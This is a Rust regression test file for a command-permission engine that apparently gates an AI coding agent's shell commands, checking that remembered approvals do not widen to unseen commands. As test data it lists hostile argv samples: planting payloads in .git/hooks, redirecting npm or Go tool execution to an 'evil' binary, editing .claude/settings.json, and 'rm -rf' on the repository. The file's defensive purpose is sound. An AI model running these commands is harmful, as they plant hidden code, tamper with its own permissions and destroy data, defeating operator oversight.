//! Regression coverage: routes by which a remembered or configured
//! exec rule reaches unseen code, tool configuration, or control paths.

use std::ffi::OsString;
use std::path::Path;

use ego_core::config::rule_management::{RuleManagement, RuleOutcome};
use ego_core::config::{ManagedRuleEffect, Mode, Ruleset, Source};
use ego_core::permit::rule::Rule;
use ego_core::permit::{
    CanonPath, Classification, EnvPolicy, Op, PolicyEngine, PreparedCall, SpawnSpec,
};

const WORKSPACE: &str = "/workspace";

fn spawn_in(cwd: &str, argv: &[&str]) -> PreparedCall {
    PreparedCall::new(
        "exec",
        Op::Spawn {
            spec: SpawnSpec::new(
                argv.iter().map(OsString::from).collect(),
                Some(CanonPath::new(cwd)),
                None,
                EnvPolicy::exact(Vec::new()).unwrap(),
            )
            .unwrap(),
        },
    )
}

fn spawn(argv: &[&str]) -> PreparedCall {
    spawn_in(WORKSPACE, argv)
}

fn covered(rules: &Ruleset, call: &PreparedCall) -> bool {
    let engine = PolicyEngine::new(CanonPath::new(WORKSPACE), Mode::Default, rules.clone());
    let allowed = !matches!(engine.classify(call.clone()), Classification::Ask(_));
    let explained = RuleManagement::explain(call, rules, Path::new(WORKSPACE)).outcome
        != RuleOutcome::Uncovered;
    allowed || explained
}

/// Failures of "remembering `original` must not cover `later`", one line each.
fn widened(cases: &[(&[&str], &[&str])]) -> Vec<String> {
    let mut failures = Vec::new();
    for (original, later) in cases {
        let mut rules = Ruleset::default();
        let suggestion = RuleManagement::suggest_remember(
            &spawn(original),
            ManagedRuleEffect::Allow,
            Path::new(WORKSPACE),
        )
        .unwrap();
        let mut stored = Vec::new();
        for candidate in suggestion.candidates {
            stored.push(candidate.to_string());
            Ruleset::merge(&mut rules.allow, candidate, Source::User);
        }
        assert!(
            covered(&rules, &spawn(original)),
            "remembered rule {stored:?} no longer covers the approved {original:?}"
        );
        if covered(&rules, &spawn(later)) {
            failures.push(format!(
                "{original:?} stored {stored:?} which covers {later:?}"
            ));
        }
    }
    failures
}

fn assert_none_widened(cases: &[(&[&str], &[&str])]) {
    let failures = widened(cases);
    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
}

// Catches: launcher/Git recognition is case-sensitive while the filesystem
// resolving the program is not (APFS, NTFS): remembering `Bash -c x` stores
// `exec(Bash *)`, which covers any later code run through the same shell.
#[test]
fn remembered_case_variants_of_launchers_and_git_keep_exact_argv() {
    assert_none_widened(&[
        (&["Bash", "-c", "echo seen"], &["Bash", "-c", "echo unseen"]),
        (&["SH", "-c", "echo seen"], &["SH", "-c", "echo unseen"]),
        (
            &["Python3", "-c", "print(1)"],
            &["Python3", "-c", "print(2)"],
        ),
        (&["NODE", "-e", "1"], &["NODE", "-e", "2"]),
        (&["Env", "ls"], &["Env", "sh", "-c", "unseen"]),
        (&["Sudo", "ls"], &["Sudo", "sh", "-c", "unseen"]),
        (
            &["Git", "status"],
            &["Git", "config", "core.hooksPath", "unseen"],
        ),
        (
            &["GIT", "log"],
            &["GIT", "init", "--template=/workspace/unseen"],
        ),
    ]);
}

// Catches: the interpreter list names only `python3`/`node`; a versioned or
// platform-suffixed interpreter, or an unlisted runner, receives `exec(<p> *)`.
#[test]
fn remembered_unlisted_interpreters_and_runners_keep_exact_argv() {
    assert_none_widened(&[
        (&["python", "-c", "print(1)"], &["python", "-c", "print(2)"]),
        (
            &["python3.12", "-c", "print(1)"],
            &["python3.12", "-c", "print(2)"],
        ),
        (&["python2", "-c", "1"], &["python2", "-c", "2"]),
        (&["nodejs", "-e", "1"], &["nodejs", "-e", "2"]),
        (&["bash.exe", "-c", "1"], &["bash.exe", "-c", "2"]),
        (&["pwsh", "-c", "1"], &["pwsh", "-c", "2"]),
        (
            &["powershell", "-Command", "1"],
            &["powershell", "-Command", "2"],
        ),
        (&["cmd", "/c", "dir"], &["cmd", "/c", "del"]),
        (&["tsx", "a.ts"], &["tsx", "-e", "unseen"]),
        (&["bunx", "a"], &["bunx", "b"]),
        (
            &["uv", "run", "a.py"],
            &["uv", "run", "--with", "evil", "b.py"],
        ),
        (&["pipx", "run", "a"], &["pipx", "run", "b"]),
        (&["caffeinate", "ls"], &["caffeinate", "sh", "-c", "unseen"]),
        (
            &["arch", "-arm64", "ls"],
            &["arch", "-arm64", "sh", "-c", "unseen"],
        ),
    ]);
}

// Catches: a configuration query of a tool program keeps the prefix, so the
// remembered read-only form authorizes a later write of tool configuration
// (the same class as the six Git control subcommands, for every other program).
#[test]
fn remembered_tool_config_queries_cannot_authorize_config_writes() {
    assert_none_widened(&[
        (
            &["npm", "config", "get", "registry"],
            &["npm", "config", "set", "script-shell", "/workspace/evil"],
        ),
        (
            &["yarn", "config", "get", "x"],
            &["yarn", "config", "set", "yarnPath", "/workspace/evil"],
        ),
        (
            &["pnpm", "config", "get", "x"],
            &["pnpm", "config", "set", "script-shell", "/workspace/evil"],
        ),
        (
            &["gh", "alias", "list"],
            &["gh", "alias", "set", "--shell", "x", "sh -c unseen"],
        ),
        (
            &["gh", "config", "get", "editor"],
            &["gh", "config", "set", "editor", "/workspace/evil"],
        ),
        (
            &["go", "env", "GOFLAGS"],
            &["go", "env", "-w", "GOFLAGS=-toolexec=/workspace/evil"],
        ),
        (
            &["kubectl", "config", "view"],
            &[
                "kubectl",
                "config",
                "set-credentials",
                "u",
                "--exec-command=/workspace/evil",
            ],
        ),
    ]);
}

// Catches: the unseen-code subcommand list is an enumeration with holes, the
// failure mode the Git allowlist was introduced to remove: `yarn exec`,
// `npm init/create/explore`, `pnpm/yarn create`, `docker container exec` and
// `docker compose run` all run what the operator never saw, like the listed
// `npm exec`, `pnpm exec`, `docker exec`.
#[test]
fn remembered_unseen_code_subcommands_outside_the_exact_list_keep_exact_argv() {
    assert_none_widened(&[
        (
            &["yarn", "exec", "ls"],
            &["yarn", "exec", "sh", "-c", "unseen"],
        ),
        (&["npm", "init", "foo"], &["npm", "init", "bar"]),
        (&["npm", "create", "foo"], &["npm", "create", "bar"]),
        (
            &["npm", "explore", "pkg", "--", "ls"],
            &["npm", "explore", "pkg", "--", "sh", "-c", "unseen"],
        ),
        (&["pnpm", "create", "foo"], &["pnpm", "create", "bar"]),
        (&["yarn", "create", "foo"], &["yarn", "create", "bar"]),
        (
            &["docker", "container", "exec", "c", "ls"],
            &["docker", "container", "exec", "c", "sh", "-c", "unseen"],
        ),
        (
            &["docker", "compose", "run", "s", "ls"],
            &["docker", "compose", "run", "s", "sh", "-c", "unseen"],
        ),
    ]);
}

// Catches: a build/test prefix covers options that name a program to run
// (`go test -exec`, `cargo --config ...runner`, `npm run --script-shell`),
// i.e. `find -exec` for subcommand programs.
#[test]
fn remembered_build_prefixes_cannot_cover_options_that_name_a_program() {
    assert_none_widened(&[
        (
            &["go", "test", "./..."],
            &["go", "test", "-exec", "/workspace/evil", "./..."],
        ),
        (
            &["go", "build", "./..."],
            &["go", "build", "-toolexec", "/workspace/evil", "./..."],
        ),
        (
            &["cargo", "test"],
            &[
                "cargo",
                "test",
                "--config",
                "target.x.runner=\"/workspace/evil\"",
            ],
        ),
        (
            &["cargo", "build"],
            &[
                "cargo",
                "build",
                "--config",
                "build.rustc-wrapper=\"/workspace/evil\"",
            ],
        ),
        (
            &["npm", "run", "build"],
            &["npm", "run", "build", "--script-shell=/workspace/evil"],
        ),
    ]);
}

// Catches: remembering a file-writing program stores `exec(<p> *)`, a route to
// control paths that the filesystem guard (Op::Write only) never sees: maintainer
// decision 1b says no allow rule covers hooks/config/control paths.
#[test]
fn remembered_file_writing_programs_cannot_reach_control_paths() {
    assert_none_widened(&[
        (
            &["cp", "a", "b"],
            &["cp", "payload", "/workspace/.git/hooks/pre-commit"],
        ),
        (
            &["mv", "a", "b"],
            &["mv", "payload", ".git/hooks/pre-commit"],
        ),
        (
            &["ln", "-s", "a", "b"],
            &["ln", "-sf", "payload", ".git/hooks/pre-commit"],
        ),
        (&["tee", "a"], &["tee", ".claude/settings.json"]),
        (&["touch", "a"], &["touch", ".ego/config.toml"]),
        (
            &["install", "a", "b"],
            &["install", "payload", ".git/hooks/pre-commit"],
        ),
        (&["rm", "a"], &["rm", "-rf", "/workspace/.git"]),
        (
            &["chmod", "600", "a"],
            &["chmod", "755", ".git/hooks/pre-commit"],
        ),
        (
            &["curl", "-o", "a", "https://example.test/a"],
            &[
                "curl",
                "-o",
                ".git/hooks/pre-commit",
                "https://example.test/a",
            ],
        ),
    ]);
}

// Catches: the control-path guard covers Op::Write only, so a configured
// (any source) `exec(...)` allow reaches control paths through an argv
// operand or through a cwd that is itself a control directory.
#[test]
fn policy_exec_allow_never_covers_control_path_operands_or_cwd() {
    let mut failures = Vec::new();
    for source in Source::ALL {
        for (rule, cwd, argv) in [
            (
                "exec(cp *)",
                WORKSPACE,
                &["cp", "payload", "/workspace/.git/hooks/pre-commit"][..],
            ),
            (
                "exec(cp *)",
                WORKSPACE,
                &["cp", "payload", ".git/hooks/x"][..],
            ),
            (
                "exec(tee *)",
                WORKSPACE,
                &["tee", ".Claude/settings.json"][..],
            ),
            (
                "exec(touch *)",
                WORKSPACE,
                &["touch", "vendor/x/.ego/y"][..],
            ),
            (
                "exec(tee *)",
                "/workspace/.git/hooks",
                &["tee", "pre-commit"][..],
            ),
            (
                "exec(touch *)",
                "/workspace/.claude",
                &["touch", "settings.json"][..],
            ),
        ] {
            let mut rules = Ruleset::default();
            Ruleset::merge(&mut rules.allow, Rule::load(rule).unwrap(), source);
            if covered(&rules, &spawn_in(cwd, argv)) {
                failures.push(format!("{source}: {rule} covers {argv:?} in {cwd}"));
            }
        }
    }
    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
}

// Catches: the Git allowlist compares case-sensitively and accepts any plain
// word, so a near-spelling of ls-tree or the bare program gets a prefix.
#[test]
fn remembered_git_near_spellings_of_the_allowlist_keep_exact_argv() {
    assert_none_widened(&[
        (&["git", "LS-TREE", "HEAD"], &["git", "LS-TREE", "--x"]),
        (&["git", "ls-tree.x", "HEAD"], &["git", "ls-tree.x", "--x"]),
        (&["git", "ls_tree", "HEAD"], &["git", "ls_tree", "--x"]),
        (&["git", "ls-tree+", "HEAD"], &["git", "ls-tree+", "--x"]),
        (
            &["git.exe", "log"],
            &["git.exe", "config", "core.hooksPath", "x"],
        ),
    ]);
}
